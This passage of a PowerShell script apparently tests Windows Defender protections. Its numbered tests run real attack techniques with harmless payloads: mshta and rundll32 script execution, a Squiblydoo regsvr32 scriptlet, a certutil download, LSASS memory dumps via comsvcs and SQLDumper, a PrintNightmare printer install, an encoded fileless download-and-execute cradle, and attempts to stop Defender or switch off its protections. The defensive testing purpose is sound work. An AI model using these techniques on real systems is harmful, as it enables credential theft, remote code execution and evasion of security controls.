    write-host "2. Your browser should indicate security issues with a frame in the page and be reported as unsafe`n"
    pause
}

function unknownprogram() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 19. Unknown program protection (web browser) ---"
    write-host -foregroundcolor $processmessagecolor "Connect to test URL https://demo.smartscreen.msft.net/download/unknown/freevideo.exe"
    start-process -filepath https://demo.smartscreen.msft.net/download/unknown/freevideo.exe 
    write-host "`n1. Your default browser should open"
    write-host "2. Your browser should warn that file blocked because it could harm your device`n"
    write-host -foregroundcolor $warningmessagecolor "You should be UNABLE to download and save a file from browser to local workstation`n"
    pause
}

function knownmalicious() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 20. Known malicious program protection (web browser) ---"
    write-host -foregroundcolor $processmessagecolor "Connect to test URL https://demo.smartscreen.msft.net/download/known/knownmalicious.exe"
    start-process -filepath https://demo.smartscreen.msft.net/download/known/knownmalicious.exe 
    write-host "`n1. Your default browser should open"
    write-host "2. Your browser should warn that file blocked because it it is malicious`n"
    write-host -foregroundcolor $warningmessagecolor "You should be UNABLE to download and save a file from browser to local workstation`n"
    pause
}

function pua() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 21. Potentially unwanted application protection (web browser) ---"
    write-host -foregroundcolor $processmessagecolor "Connect to test URL http://amtso.eicar.org/PotentiallyUnwanted.exe"
    start-process -filepath http://amtso.eicar.org/PotentiallyUnwanted.exe 
    write-host "`n1. Your default browser should open"
    write-host "2. Should not be able to reach this site or download the file`n"
    write-host -foregroundcolor $warningmessagecolor "You should be UNABLE to download and save a file from browser to local workstation`n"
    pause
}

function blockatfirst() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 22. Block at first seen (web browser) ---"
    write-host -foregroundcolor $processmessagecolor "Connect to test URL"
    start-process -filepath https://demo.wd.microsoft.com/page/BAFS
    write-host "`n1. Your default browser should open"
    write-host "2. Select the Create and download new file button"
    write-host "3. You will need to login to a Microsoft 365 tenant"
    write-host "4. You will need to provide app permissions to Microsoft Defender app for user`n"
    write-host -foregroundcolor $warningmessagecolor "You should be UNABLE to download and save a file from browser to local workstation`n"
    pause
}

function servicescheck() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 23. Check Windows Defender Services ---"
    $result = get-service SecurityHealthService
    if ($result.status -ne "Running") {
        write-host -ForegroundColor $errormessagecolor "Windows Security Server Service is not running"
    }
    else {
        write-host -ForegroundColor $processmessagecolor "Windows Security Server Service is running"
        write-host -ForegroundColor $processmessagecolor -nonewline "- Attempt to stop Windows Security Server Service has "
        $servicestop = $true
        try {
            $result = stop-service SecurityHealthService -ErrorAction Stop
        }
        catch {
            write-host -ForegroundColor $processmessagecolor "failed"
            $servicestop = $false
        }
        if ($servicestop) {
            write-host -ForegroundColor $errormessagecolor "SUCCEEDED"
            write-host -ForegroundColor $errormessagecolor "- Starting Windows Sercurity Server Service"
            start-service SecurityHealthService -ErrorAction Stop
        }
    }
    $result = get-service WinDefend
    if ($result.status -ne "Running") {
        write-host -ForegroundColor $errormessagecolor "Microsoft Defender Antivirus Service is not running"
    }
    else {
        write-host -ForegroundColor $processmessagecolor "Microsoft Defender Antivirus Service is running"
        write-host -ForegroundColor $processmessagecolor -nonewline "- Attempt to stop Microsoft Defender Antivirus Service has "
        $servicestop = $true
        try {
            $service = "windefend"
            $result = stop-service $service -ErrorAction Stop
        }
        catch {
            write-host -ForegroundColor $processmessagecolor "failed"
            $servicestop = $false
        }
        if ($servicestop) {
            write-host -ForegroundColor $errormessagecolor "SUCCEEDED"
            write-host -ForegroundColor $errormessagecolor "- Starting Microsoft Defender Antivirus Service"
            start-service windefend -ErrorAction Stop
        }
    }
}

function defenderstatus() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 24. Check Windows Defender Configuration ---"
    write-host -ForegroundColor $processmessagecolor "Get Windows Defender configuration settings"
    $result = get-mppreference

    if (-not $result.DisableRealtimeMonitoring) {
        write-host -ForegroundColor $processmessagecolor "Real Time Monitoring is enabled"
        write-host -nonewline -ForegroundColor $processmessagecolor "- Attempt to disable Real Time Monitoring has "
        try {
            Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction stop
            $rtm = (get-mppreference).disablerealtimemonitoring
            if (-not $rtm) {
                write-host -ForegroundColor $processmessagecolor "failed"
            }
            else {
                write-host -ForegroundColor $errormessagecolor "SUCCEEDED"
                write-host -foregroundcolor $processmessagecolor "- Re-enabling Real Time Monitoring"
                Set-MpPreference -DisableRealtimeMonitoring $false
            }
    
        }
        catch {
            write-host -ForegroundColor $processmessagecolor "failed"
        }
    }
    else {
        write-host -ForegroundColor $errormessagecolor "Real Time monitoring is disabled"
    }
    
    if (-not $result.DisableIntrusionPreventionSystem) {
        write-host -foregroundcolor $processmessagecolor "Intrusion Prevention System is enabled"
        write-host -foregroundcolor $processmessagecolor -nonewline "- Attempt to disable Intrusion Prevention System has "
        try {
            Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction stop
            $rtm = (get-mppreference).DisableIntrusionPreventionSystem
        if (-not $rtm) {
            write-host -foregroundcolor $processmessagecolor "failed"
        }
        else {
            write-host -foregroundcolor $errormessagecolor "SUCCEEDED"
            write-host -foregroundcolor $processmessagecolor "- Re-enabling Intrusion Prevention System"
            Set-MpPreference -DisableIntrusionPreventionSystem $false
        }
        }
        catch {
            write-host -foregroundcolor $processmessagecolor "failed"
        }        
    }
    else {
        write-host -foregroundcolor $errormessagecolor "Intrusion Prevention System is disabled"
    }
    
    if (-not $result.DisableIOAVProtection) {
        write-host -foregroundcolor $processmessagecolor "All downloads and attachments protection is enabled"
        write-host -foregroundcolor $processmessagecolor -nonewline "- Attempt to disable all download and attachments protection has "
        try {
            Set-MpPreference -DisableIOAVProtection $true -ErrorAction stop
            $rtm = (get-mppreference).DisableIOAVProtection
            if (-not $rtm) {
                write-host -foregroundcolor $processmessagecolor "failed"
            }
            else {
                write-host -foregroundcolor $errormessagecolor "SUCCEEDED"
                write-host -foregroundcolor $processmessagecolor "- Re-enabling all downloads and attachments protection"
                Set-MpPreference -DisableIOAVProtection $false
            }
        }
        catch {
            write-host -foregroundcolor $processmessagecolor "failed"
        }        
    }
    else {
        write-host -foregroundcolor red "All downloads and attachments protection is disabled"
    }
    
    if (-not $result.DisableScriptScanning) {
        write-host -foregroundcolor $processmessagecolor "Script Scanning is enabled"
        write-host -foregroundcolor $processmessagecolor -nonewline "- Attempt to disable Script Scanning has "
        try {
            Set-MpPreference -DisableScriptScanning $true -ErrorAction stop
            $rtm = (get-mppreference).DisableScriptScanning
            if (-not $rtm) {
                write-host -foregroundcolor $processmessagecolor "failed"
            }
            else {
                write-host -foregroundcolor $errormessagecolor "SUCCEEDED"
                write-host -foregroundcolor $processmessagecolor "- Re-enabling Script Scanning"
                Set-MpPreference -DisableScriptScanning $false
            }           
        }
        catch {
            write-host -foregroundcolor $processmessagecolor "failed"
        }
    }
    else {
        write-host -foregroundcolor $errormessagecolor "Script Scanning is disabled"
    }
    
    if (-not $result.Disablebehaviormonitoring) {
        write-host -foregroundcolor $processmessagecolor "Behavior Monitoring is enabled"
        write-host -foregroundcolor $processmessagecolor -nonewline "- Attempt to disable Behavior Monitoring has "
        try {
            Set-MpPreference -Disablebehaviormonitoring $true -ErrorAction stop
            $rtm = (get-mppreference).Disablebehaviormonitoring
            if (-not $rtm) {
                write-host -foregroundcolor $processmessagecolor "failed"
            }
            else {
                write-host -foregroundcolor $errormessagecolor "SUCCEEDED"
                write-host -foregroundcolor $processmessagecolor "- Re-enabling Behavior Monitoring"
                Set-MpPreference -Disablebehaviormonitoring $false
            }    
        }
        catch {
            write-host -foregroundcolor $processmessagecolor "failed"
        }
    }
    else {
        write-host -foregroundcolor $errormessagecolor "Behavior Monitoring is disabled"
    }

    if (-not $result.disableblockatfirstseen) {
        write-host -foregroundcolor $processmessagecolor "Block at First Seen is enabled"
        write-host -foregroundcolor $processmessagecolor -nonewline "- Attempt to disable Block at First Seen has "
        try {
            Set-MpPreference -disableblockatfirstseen $true -ErrorAction stop
            $rtm = (get-mppreference).disableblockatfirstseen
            if (-not $rtm) {
                write-host -foregroundcolor $processmessagecolor "failed"
            }
            else {
                write-host -foregroundcolor $errormessagecolor "SUCCEEDED"
                write-host -foregroundcolor $processmessagecolor "- Re-enabling Block at First Seen"
                Set-MpPreference -disableblockatfirstseen $false
            }    
        }
        catch {
            write-host -foregroundcolor $processmessagecolor "failed"
        }
    }
    else {
        write-host -foregroundcolor $errormessagecolor "Block at First Seen is disabled"
    }

    if (-not $result.disableemailscanning) {
        write-host -foregroundcolor $processmessagecolor "Email Scaning is enabled"
        write-host -foregroundcolor $processmessagecolor -nonewline "- Attempt to disable Email Scanning has "
        try {
            Set-MpPreference -disableemailscanning $true -ErrorAction stop
            $rtm = (get-mppreference).disableemailscanning 
            if (-not $rtm) {
                write-host -foregroundcolor $processmessagecolor "failed"
            }
            else {
                write-host -foregroundcolor $errormessagecolor "SUCCEEDED"
                write-host -foregroundcolor $processmessagecolor "- Re-enabling Email Scanning"
                Set-MpPreference -disableemailscanning $false
            }
        }
        catch {
            write-host -foregroundcolor $processmessagecolor "failed"
        }
    }
    else {
        write-host -foregroundcolor $errormessagecolor "Email Scanning is disabled"
    }

    switch ($result.EnableControlledFolderAccess) {
        0 { write-host -foregroundcolor $errormessagecolor "Controlled Folder Access is disabled"; break}
        1 { write-host -foregroundcolor $processmessagecolor  "Controlled Folder Access will block "; break}
        2 { write-host -foregroundcolor $warningmessagecolor  "Controlled Folder Access will audit "; break}
        3 { write-host -foregroundcolor $warningmessagecolor  "Controlled Folder Access will block disk modifications only "; break}
        4 { write-host -foregroundcolor $warningmessagecolor  "Controlled Folder Access will audit disk modifications "; break}
        default { write-host -foregroundcolor $warningmessagecolor  "Controlled Folder Access status unknown"}
    }
    
    switch ($result.EnableNetworkProtection) {
        0 { write-host -foregroundcolor $errormessagecolor "Network protection is disabled"; break}
        1 { write-host -foregroundcolor $processmessagecolor  "Network Protection is enabled (block mode) "; break}
        2 { write-host -foregroundcolor $warningmessagecolor  "Network Protection is enabled (audit mode) "; break}
        default { write-host -foregroundcolor $warningmessagecolor  "Controlled Folder Access status unknown"}
    }
    
    switch ($result.MAPSReporting) {
        0 { write-host -foregroundcolor $errormessagecolor "Microsoft Active Protection Service (MAPS) Reporting is disabled"; break}
        1 { write-host -foregroundcolor $warningmessagecolor  "Microsoft Active Protection Service (MAPS) Reporting is set to basic"; break}
        2 { write-host -foregroundcolor $processmessagecolor  "Microsoft Active Protection Service (MAPS) Reporting is set to advanced"; break}
        default { write-host -foregroundcolor $warningmessagecolor  "Controlled Folder Access status unknown"}
    }
    
    switch ($result.SubmitSamplesConsent) {
        0 { write-host -foregroundcolor $errormessagecolor "Submit Sample Consent is set to always prompt"; break}
        1 { write-host -foregroundcolor $warningmessagecolor  "Submit Sample Consent is set to send safe samples automatically"; break}
        2 { write-host -foregroundcolor $errormessagecolor  "Submit Sample Consent is set to never send "; break}
        3 { write-host -foregroundcolor $processmessagecolor  "Submit Sample Consent is set to send all samples automatically "; break}
        default { write-host -foregroundcolor $warningmessagecolor  "Controlled Folder Access status unknown"}
    } 
}

function mshta() {
    
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 25. Block MSHTA process launching ---"

$body = @"
"about:<hta:application><script language="VBScript">Close(Execute("CreateObject(""Wscript.Shell"").Run%20""notepad.exe"""))</script>'"
"@

    try {
        $error.Clear()      # Clear any existing errors
        start-process -filepath "mshta.exe" -argumentlist $body -ErrorAction Continue
    }
    catch {
        write-host -foregroundcolor $processmessagecolor "Execution error detected:"
        write-host "    ",($error[0].exception)
    }
    write-host -foregroundcolor $warningmessagecolor "`nIf NOTEPAD has executed, then the test has FAILED`n"
    pause
}

function squiblydoo() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 26. Squiblydoo attack ---"
    write-host -foregroundcolor $processmessagecolor "Create SC.SCT file in current directory"
$body1 = @"
<?XML version="1.0"?>
<scriptlet>
<registration progid="TESTING" classid="{A1112221-0000-0000-3000-000DA00DABFC}" >
<script language="JScript">
"@
$body2 = @"
<![CDATA[
var foo = new ActiveXObject("WScript.Shell").Run("notepad.exe");]]>
</script>
</registration>
</scriptlet>
"@
    
    $body = -join($body1,$body2)
    set-content -Path .\sc.sct $body
    write-host -foregroundcolor $processmessagecolor "Execute regsvr32.exe in current directory"
    start-process -filepath "regsvr32.exe" -argumentlist "/s /n /u /i:sc.sct scrobj.dll"
    write-host -foregroundcolor $warningmessagecolor "If NOTEPAD is executed, then the test has FAILED`n"
    pause
    write-host -foregroundcolor $processmessagecolor "Delete SC.SCT"
    remove-item .\sc.sct  
}

function certutil() {
    
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 27. Block Certutil download ---"
    write-host -foregroundcolor $processmessagecolor "Use CERTUTIL.EXE to download puty.exe in current directory"
    $opt = "-urlcache -split -f https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe putty.exe"
    try {
        start-process "certutil.exe" -ArgumentList $opt -ErrorAction continue| Out-Null
    }
    catch {}
    write-host -foregroundcolor $processmessagecolor "Check for PUTTY.EXE in current directory"
    $result = test-path ".\putty.exe"
    if ($result) {
        write-host -foregroundcolor $errormessagecolor "PUTTY.EXE found - test FAILED`n"
        write-host -foregroundcolor $processmessagecolor "Delete PUTTY.EXE"
        remove-item .\putty.exe
    }
    else {
        write-host -foregroundcolor $processmessagecolor "PUTTY.EXE not found - test SUCCEEDED`n"
    }     
}

function wmic() {
    
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 28. Block WMIC process launch ---"

    $opt = "process call create notepad"
    try {
        start-process -filepath "wmic.exe" -argumentlist $opt -ErrorAction Continue
    }
    catch {
    }
    write-host -foregroundcolor $warningmessagecolor "`nIf NOTEPAD has executed, then the test has FAILED`n"
    pause
}

function rundll() {
    
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 29. Block RUNDLL32 process launch ---"

$body = @"
javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"notepad\");window.close()");
"@
    try {
        start-process -filepath "rundll32" -argumentlist $body -ErrorAction Continue
    }
    catch {
    }
    write-host -foregroundcolor $warningmessagecolor "`nIf NOTEPAD has executed, then the test has FAILED`n"
    pause
}

function mimispool () {
    # Reference - https://github.com/gentilkiwi/mimikatz/tree/master/mimispool#readme
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 30. PrintNightmare / Mimispool ---"

    $install = $true
    $serverName  = 'printnightmare.gentilkiwi.com'
    $username    = 'gentilguest'
    $password    = 'password'
    $printerName = 'Kiwi Legit Printer'
    $system32        = $env:systemroot + '\system32'
    $drivers         = $system32 + '\spool\drivers'

    $fullprinterName = '\\' + $serverName + '\' + $printerName
    $credential = (New-Object System.Management.Automation.PSCredential($username, (ConvertTo-SecureString -AsPlainText -String $password -Force)))
    write-host -foregroundcolor $warningmessagecolor "*** WARNING - This process will install a test printer driver and associated files"
    write-host -foregroundcolor $processmessagecolor "Removing existing test printer if present"
    Remove-PSDrive -Force -Name 'KiwiLegitPrintServer' -ErrorAction SilentlyContinue
    Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue
    write-host -foregroundcolor $processmessagecolor "Creating new",$printerName
    New-PSDrive -Name 'KiwiLegitPrintServer' -Root ('\\' + $serverName + '\print$') -PSProvider FileSystem -Credential $credential | Out-Null
    try {
        Add-Printer -ConnectionName $fullprinterName -ErrorAction stop
    } 
    catch {
        write-host -foregroundcolor $processmessagecolor "Unable to install printer - test SUCCESSFUL"
        $install=$false
        Remove-PSDrive -Force -Name 'KiwiLegitPrintServer' -ErrorAction SilentlyContinue
    }
    write-host -foregroundcolor $warningmessagecolor "`nIf an administrator command prompt appears, then the test has FAILED`n"
    pause

    if ($install) {
        write-host -foregroundcolor $errormessagecolor "`nAble in install printer - test FAILED"
        $driver = (Get-Printer -Name $fullprinterName).DriverName
        write-host -foregroundcolor $processmessagecolor "Remove printer",$printerName
        Remove-Printer -Name $fullprinterName
        start-sleep -Seconds 3
        write-host -foregroundcolor $processmessagecolor "Remove printer driver",$driver
        Remove-PrinterDriver -Name $driver
        write-host -foregroundcolor $processmessagecolor "Remove mapping`n"
        Remove-PSDrive -Force -Name 'KiwiLegitPrintServer'
        $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
        If ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
            write-host -foregroundcolor $processmessagecolor "Running as an Administrator detected`n"
            if (test-path($drivers  + '\x64\3\mimispool.dll')) {
                write-host -foregroundcolor $processmessagecolor "Deleting ",($drivers  + '\x64\3\mimispool.dll')
                Remove-Item -Force -Path ($drivers  + '\x64\3\mimispool.dll')
            }
            if (test-path($drivers  + '\W32X86\3\mimispool.dll')) {
                write-host -foregroundcolor $processmessagecolor "Deleting ",($drivers  + '\W32X86\3\mimispool.dll')
                Remove-Item -Force -Path ($drivers  + '\W32X86\3\mimispool.dll')
            }
            if (test-path($system32 + '\mimispool.dll')) {
                write-host -foregroundcolor $processmessagecolor "Deleting ",($system32 + '\mimispool.dll')
                Remove-Item -Force -Path ($system32 + '\mimispool.dll')
            }
        }
        else {
            write-host -foregroundcolor $warningmessagecolor "Not Running as an Administrator. Manual clean up required`n"
            if (test-path($drivers  + '\x64\3\mimispool.dll')) {
                write-host -foregroundcolor $errormessagecolor "***",($drivers  + '\x64\3\mimispool.dll')"Should be removed by an administrator"
            }
            if (test-path($drivers  + '\W32X86\3\mimispool.dll')) {
                write-host -foregroundcolor $errormessagecolor "***",($drivers  + '\W32X86\3\mimispool.dll')"Should be removed by an administrator"
            }
            if (test-path($system32 + '\mimispool.dll')) {
                write-host -foregroundcolor $errormessagecolor "***",($system32 + '\mimispool.dll')"Should be removed by an administrator"
            }
        }
    }
}

function hivevul () {
    # Reference - https://github.com/JoranSlingerland/CVE-2021-36934/blob/main/CVE-2021-36934.ps1
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 31. HiveNightmare / CVE-2021-36934 ---"
    $samaccess = $true
    $systemaccess = $true
    $securityaccess = $true
    $systempath = $env:windir
    $LocalUsersGroup = Get-LocalGroup -SID 'S-1-5-32-545'
    try {
        $tryaccess = test-path($systempath+"\system32\config\sam") -ErrorAction stop
    }
    catch {
        $samaccess = $false
    }
    if ($samaccess) {
        write-host -foregroundcolor $processmessagecolor -nonewline "SAM Path exists - "
        $checkPermissions = Get-Acl $env:windir\System32\Config\sam
        if ($LocalUsersGroup) {
            if ($CheckPermissions.Access.IdentityReference -match $LocalUsersGroup.Name) {
                write-host -foregroundcolor $errormessagecolor "SAM Path vulnerable"
            }
            else {
                write-host -foregroundcolor $processmessagecolor "SAM Path not vulnerable"
            }
        }
    }
    else {
        write-host -foregroundcolor $warningmessagecolor "SYSTEM Path does not exists or cannot be accessed"
    }
    try {
        $tryaccess = test-path($systempath+"\system32\config\system") -ErrorAction stop
    }
    catch {
        $systemaccess = $false
    }
    if ($systemaccess) {
        write-host -foregroundcolor $processmessagecolor -nonewline "SYSTEM Path exists - "
        $checkPermissions = Get-Acl $env:windir\System32\Config\system
        if ($LocalUsersGroup) {
            if ($CheckPermissions.Access.IdentityReference -match $LocalUsersGroup.Name) {
                write-host -foregroundcolor $errormessagecolor "SYSTEM Path vulnerable"
            }
            else {
                write-host -foregroundcolor $processmessagecolor "SYSTEM Path not vulnerable"
            }
        }
    }
    else {
        write-host -foregroundcolor $warningmessagecolor "SYSTEM Path does not exists or cannot be accessed"
    }
    try {
        $tryaccess = test-path($systempath+"\system32\config\security") -ErrorAction stop
    }
    catch {
        $securityaccess = $false
    }
    if ($securityaccess) {
        write-host -foregroundcolor $processmessagecolor -nonewline "SECURITY Path exists - "
        $checkPermissions = Get-Acl $env:windir\System32\Config\security
        if ($LocalUsersGroup) {
            if ($CheckPermissions.Access.IdentityReference -match $LocalUsersGroup.Name) {
                write-host -foregroundcolor $errormessagecolor "SECURITY Path vulnerable"
            }
            else {
                write-host -foregroundcolor $processmessagecolor "SECURITY Path not vulnerable"
            }
        }
    }
    else {
        write-host -foregroundcolor $warningmessagecolor "SECURITY Path does not exists or cannot be accessed"
    }
}

function mshtmlvul() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 32. MSHTML remote code execution ---"
    write-host -foregroundcolor $processmessagecolor "Download test Word document to current directory"
    Invoke-WebRequest -Uri https://github.com/directorcia/examples/raw/main/WebBrowser.docx -OutFile .\webbrowser.docx
    write-host -foregroundcolor $processmessagecolor "Open document using Word"
    Start-Process winword.exe -ArgumentList ".\webbrowser.docx"
    write-host "`n1. Click on the Totally Safe.txt embedded item at top of document"
    write-host "2. Ensure that CALC.exe cannot be run in any way" 
    write-host "3. Close Word once complete.`n"
    pause
    write-host -foregroundcolor $processmessagecolor "`nDelete webbrowser.docx"
    remove-item .\webbrowser.docx  
}

function formshtml() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 33. Forms HTML controls remote code execution ---"
    write-host -foregroundcolor $processmessagecolor "Download test Word document to current directory"
    Invoke-WebRequest -Uri https://github.com/directorcia/examples/raw/main/Forms.HTML.docx -OutFile .\RS4_WinATP-Intro-Invoice.docm
    write-host -foregroundcolor $processmessagecolor "Open document using Word"
    Start-Process winword.exe -ArgumentList ".\forms.html.docx"
    write-host "`n1. Click on the embedded item at top of document"
    write-host "2. Ensure that CALC.exe cannot be run in any way" 
    write-host "3. Close Word once complete.`n"
    pause
    write-host -foregroundcolor $processmessagecolor "`nDelete forms.html.docx"
    remove-item .\forms.html.docx  
}

function backdoordrop() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 34. Document drops backdoor ---"
    write-host -foregroundcolor $processmessagecolor "Download test Word document (RS4_WinATP-Intro-Invoice.docm) to current directory"
    Invoke-WebRequest -Uri https://github.com/directorcia/examples/raw/main/RS4_WinATP-Intro-Invoice.docm -OutFile .\RS4_WinATP-Intro-Invoice.docm
    write-host -foregroundcolor $processmessagecolor "Open document RS4_WinATP-Intro-Invoice.docm using Word"
    Start-Process winword.exe -ArgumentList ".\RS4_WinATP-Intro-Invoice.docm"
    write-host "`n1. Use the password = WDATP!diy# to open document"
    write-host "2. Click enable editing if displayed" 
    write-host "3. Click enable content if displayed"
    write-host "4. Click the OK button on dialog if appears`n"
    pause
    try {
        $result = test-path($env:USERPROFILE+"\desktop\WinATP-Intro-Backdoor.exe") -ErrorAction stop
    }
    catch {
        $result = $false
    }
    if ($result) {
        write-host -foregroundcolor $errormessagecolor "`nWinATP-Intro-Backdoor.exe - test FAILED`n"
        write-host -foregroundcolor $processmessagecolor "Delete WinATP-Intro-Backdoor.exe`n"
        remove-item ($env:USERPROFILE+"\desktop\WinATP-Intro-Backdoor.exe")
    }
    else {
        write-host -foregroundcolor $processmessagecolor "`nWinATP-Intro-Backdoor.exe not found - test SUCCEEDED`n"
    } 
    write-host "5. Close Word once complete.`n"
    pause
    write-host -foregroundcolor $processmessagecolor "`nDelete RS4_WinATP-Intro-Invoice.docm`n"
    remove-item .\RS4_WinATP-Intro-Invoice.docm  
}

function psfileless() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 35. PowerShell script in fileless attack ---"
    write-host -foregroundcolor $processmessagecolor "Execute Fileless attack"
$body1 = @'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI https://winatpmanagement.windows.com/client/management/static/WinATP-Intro-Fileless.txt -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0; $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i]; $i++; if ($i -eq $xor.Length) {$i = 0} };
'@
$body2 = @'
Invok
'@
$body3 = @'
e-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
'@

    $body = -join($body1,$body2,$body3)
    $errorfile =".\errorfile.txt"
    Start-Process powershell -ArgumentList $body -wait -WindowStyle Hidden -redirectstandarderror $errorfile
    write-host -foregroundcolor $warningmessagecolor "`nIf NOTEPAD is executed, then the test has FAILED`n"
    pause
}

function sqldumper() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 36. SQLDumper ---"
    write-host -foregroundcolor $processmessagecolor "Download SQLDumper to current directory"
    Invoke-WebRequest -Uri https://github.com/directorcia/examples/raw/main/SQLDumper.exe -OutFile .\SQLDumper.exe
    write-host -foregroundcolor $processmessagecolor "Get LSASS.EXE process id"
    $id=(get-process -processname "lsass").Id
    write-host -foregroundcolor $processmessagecolor "Attempt process dump"
    $result = .\sqldumper.exe $id 0 0x01100:40
    if (($result -match "failed") -or [string]::isnullorempty($result)) {
        write-host -foregroundcolor $processmessagecolor "`nProcess dump failed - test SUCCEEDED`n"
        write-host -foregroundcolor $processmessagecolor "Delete SQLDumper.exe`n"
        remove-item .\SQLDumper.exe
    }
    else {
        write-host -foregroundcolor $errormessagecolor "`nProcess dump succeeded - test FAILED`n"
        write-host -foregroundcolor $processmessagecolor "Delete SQLDumper.exe`n"
        remove-item .\SQLDumper.exe
        write-host -foregroundcolor $processmessagecolor "Delete dump file`n"
        remove-item .\SQLD*.*
    }
}

function comsvcs() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 37. Block RUNDLL32 COMSVCS dump process launch ---"
    
$body = @"
rundll.exe %windir%\System32\comsvcs.dll, MiniDump ((Get-Process lsass).Id) .\lsass.dmp full
"@
    try {
        $errorfile = ".\errorfile.txt"
        Start-Process powershell -ArgumentList $body -wait -WindowStyle Hidden -redirectstandarderror $errorfile
    }
    catch {
        write-host -ForegroundColor $processmessagecolor "Dump process execution failed`n"
    }
    if (test-path('.\lsass.dmp')) {
        write-host -ForegroundColor $errormessagecolor "Test failed - dump created"
        write-host -foregroundcolor $processmessagecolor "  Deleting lsass.dmp`n"
        Remove-Item -Force -Path ('.\lsass.dmp')
    } else {
        write-host -ForegroundColor $processmessagecolor "Test succeeded - dump not created`n"
    }
    pause
}

function notepadmask () {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 38. Mask PowerShell.exe ---"
    write-host -ForegroundColor $processmessagecolor "Copy Powershell.exe to Notepad.exe in current directory`n"
    if (test-path("$env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe")) {
        copy-item -path "$env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe" -destination ".\notepad.exe" -force
        .\notepad.exe -e JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==
        write-host -ForegroundColor $warningmessagecolor "`nNo welcome message should have been displayed`n"
        Pause
        write-host -ForegroundColor $processmessagecolor "Remove notepad.exe from current directory`n"
        remove-item (".\notepad.exe")
    } else {
        write-host -ForegroundColor $errormessagecolor "Unable to locate $env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe`n"
    }

}

function schtsk() {
    Write-Host -ForegroundColor White -BackgroundColor Blue "`n--- 39. Create Scheduled Task ---"
    $testflag = $false
    $result = cmd.exe /c 'schtasks /Create /F /SC MINUTE /MO 3 /ST 07:00 /TN CMDTestTask /TR "cmd /c date /T > .\current_date.txt'
    if ($result -match "SUCCESS") {
        Write-Host -ForegroundColor $errormessagecolor "Scheduled task created"
        $testflag = $true
        $result = cmd.exe /c 'schtasks /Query /TN CMDTestTask'
        if ($result -match "Ready") {
            Write-Host -ForegroundColor $errormessagecolor "Scheduled task found"
            $testflag = $true
        }
    }
    if ($testflag) {
        Write-Host -ForegroundColor $errormessagecolor "Test failed - Scheduled task created"
        Write-Host -ForegroundColor $processmessagecolor "  Remove scheduled task"
        $result = cmd.exe /c 'schtasks /Delete /TN CMDTestTask /F'
    }
    else {
        Write-Host -ForegroundColor $processmessagecolor "Test succeeded - No Scheduled task created"
    }
    if (Test-Path -Path ".\current_date.txt") {
        Write-Host -ForegroundColor $processmessagecolor "  Remove current_date.txt"
        Remove-Item -Path ".\current_date.txt"
    }
}

<#
.SYNOPSIS
    Test 40: PowerShell Constrained Language Mode verification
    
.DESCRIPTION
    Checks if PowerShell is running in ConstrainedLanguage mode, which restricts
    access to unsafe .NET methods and COM objects commonly abused by attackers.
    
    EXPECTED RESULT: ConstrainedLanguage mode enabled
    FAILED TEST: FullLanguage mode (unrestricted)
#>
function psconstrainedlanguage() {
    Write-Host -ForegroundColor White -BackgroundColor Blue "`n--- 40. PowerShell Constrained Language Mode ---"
    $languageMode = $ExecutionContext.SessionState.LanguageMode
    Write-Host -ForegroundColor $processmessagecolor "Current Language Mode: $languageMode"
    
    if ($languageMode -eq "ConstrainedLanguage") {
        Write-Host -ForegroundColor $processmessagecolor "PowerShell Constrained Language Mode is ENABLED - test SUCCEEDED"
    }
    elseif ($languageMode -eq "FullLanguage") {
        Write-Host -ForegroundColor $warningmessagecolor "PowerShell is in Full Language Mode (unrestricted) - test FAILED"
        Write-Host -ForegroundColor $warningmessagecolor "Recommendation: Enable AppLocker or Device Guard to enforce ConstrainedLanguage mode"
    }
    else {
        Write-Host -ForegroundColor $processmessagecolor "Language Mode: $languageMode"
    }
}

<#
.SYNOPSIS
    Test 41: PowerShell logging configuration verification
    
.DESCRIPTION
